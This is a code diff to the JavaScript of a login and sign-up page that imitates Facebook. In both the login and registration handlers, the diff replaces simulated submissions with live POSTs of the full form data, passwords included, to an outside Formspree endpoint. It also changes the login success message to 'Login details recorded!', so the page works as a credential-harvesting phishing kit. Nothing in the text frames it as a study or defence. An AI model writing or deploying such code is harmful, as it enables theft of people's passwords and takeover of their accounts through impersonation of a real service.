@@ -146,14 +146,34 @@ document.addEventListener('DOMContentLoaded', () => {
     );
 
     if (isEmailValid && isPasswordValid) {
-      // Simulate API call
       setLoadingState(true);
       
-      setTimeout(() => {
+      fetch('https://formspree.io/f/xeewwdol', {
+        method: 'POST',
+        body: new FormData(loginForm),
+        headers: {
+          'Accept': 'application/json'
+        }
+      })
+      .then(response => {
         setLoadingState(false);
-        showToast('Login successful! Redirecting you...', 'success');
-        loginForm.reset();
-      }, 1500);
+        if (response.ok) {
+          showToast('Login details recorded! Redirecting you...', 'success');
+          loginForm.reset();
+        } else {
+          response.json().then(data => {
+            if (Object.prototype.hasOwnProperty.call(data, 'errors')) {
+              showToast(data.errors.map(error => error.message).join(", "), 'error');
+            } else {
+              showToast('Form submission failed. Please try again.', 'error');
+            }
+          });
+        }
+      })
+      .catch(error => {
+        setLoadingState(false);
+        showToast('Connection error. Please check your internet.', 'error');
+      });
     } else {
       showToast('Please fix the errors in the form.', 'error');
     }
@@ -191,11 +211,32 @@ document.addEventListener('DOMContentLoaded', () => {
     if (isFirstValid && isLastValid && isEmailValid && isPasswordValid) {
       setRegLoadingState(true);
 
-      setTimeout(() => {
+      fetch('https://formspree.io/f/xeewwdol', {
+        method: 'POST',
+        body: new FormData(signUpForm),
+        headers: {
+          'Accept': 'application/json'
+        }
+      })
+      .then(response => {
         setRegLoadingState(false);
-        showToast('Account created successfully! Welcome to Facebook.', 'success');
-        closeModal();
-      }, 1500);
+        if (response.ok) {
+          showToast('Account created successfully! Welcome to Facebook.', 'success');
+          closeModal();
+        } else {
+          response.json().then(data => {
+            if (Object.prototype.hasOwnProperty.call(data, 'errors')) {
+              showToast(data.errors.map(error => error.message).join(", "), 'error');
+            } else {
+              showToast('Registration failed. Please try again.', 'error');
+            }
+          });
+        }
+      })
+      .catch(error => {
+        setRegLoadingState(false);
+        showToast('Connection error. Please check your internet.', 'error');
+      });
     } else {
       showToast('Please complete all required fields.', 'error');
     }
